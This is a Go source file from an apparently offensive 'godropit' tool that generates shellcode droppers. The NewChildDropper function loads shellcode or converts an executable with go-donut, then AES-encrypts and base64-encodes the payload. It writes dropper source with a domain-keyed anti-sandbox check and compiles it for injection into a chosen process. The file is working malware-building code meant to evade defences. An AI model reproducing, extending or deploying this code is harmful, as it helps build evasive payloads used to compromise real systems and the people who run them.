package gengo

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/Epictetus24/godropit/internal/gengo/child"
	"github.com/Epictetus24/godropit/pkg/box"
	"github.com/Epictetus24/godropit/pkg/dropfmt"
	"github.com/fatih/color"
)

func NewLocalDropper() {

}

// Creates and builds a new child dropper.
func NewChildDropper(input, output, domain, dropname, proc, args string, delay int, sgn, dll, arch bool) {
	//var archInt int
	var shellcode dropfmt.DropFmt
	/*
		if arch {
			color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
			archInt = 32
		} else {
			archInt = 64
		}
	*/
	if input == "CALC" {
		shellcode.Buf = CalcCode
	} else {
		shellcode = GetShellcode(input)
	}
	fmt.Printf(dropname)
	goDrop := child.NewChild(args, proc, domain, delay)
	if sgn {
		color.Yellow("Shikata Ga Nai encoding shellcode.")
		//shellcode.SGN(archInt)
	}

	//Format Shellcode for dropper.
	shellcode.AESEncrypt()
	goDrop.Bufstr = shellcode.ToB64()
	goDrop.KeyStr = shellcode.KeyB64()
	scFilepath := filepath.Join(output + dropname + "_encryptedB64.txt")
	//Write shellcode files in case they are needed later.
	scFile, err := os.Create(scFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
	scFile.WriteString("ShellcodeBuf:\n" + goDrop.Bufstr)
	scFile.Close()
	binFilepath := filepath.Join(output + dropname + "_Clear.bin")
	fmt.Println(binFilepath)
	binFile, err := os.Create(binFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	binFile.Write(shellcode.Buf)
	binFile.Close()

	//write our dropper template.
	dropfilename := dropname + "_gDropper.go"
	dropFilepath := filepath.Join(output + dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	if domain != "" {
		goDrop.BoxChk = box.DomKey
	} else {
		//other antisandbox?
	}

	err = goDrop.WriteSrc(dropperFile)
	if err != nil {
		log.Fatalf("Error writing dropper source: %v", err)
	}
	dropperFile.Close()
	color.Green("Dropper src written to : %s\n", dropFilepath)

	buildFileGo(output, dropname, dll, arch)

}

func NewRemoteDropper() {

}

func GetShellcode(input string) dropfmt.DropFmt {
	var shellcode []byte
	var errShellcode error
	var dropper dropfmt.DropFmt

	if strings.Contains(input, ".exe") {

		color.Yellow("Exe detected as an input file, attempting to generate shellcode with go-donut.\n")
		shellcode, errShellcode = DonutShellcode(input, false)
		if errShellcode != nil {
			color.Red(fmt.Sprintf("[!]%s", errShellcode.Error()))
			os.Exit(1)
		}

	} else {
		shellcode, errShellcode = ioutil.ReadFile(input)

		if errShellcode != nil {
			color.Red(fmt.Sprintf("[!]%s", errShellcode.Error()))
			os.Exit(1)
		}

	}

	dropper.Buf = shellcode

	return dropper

}
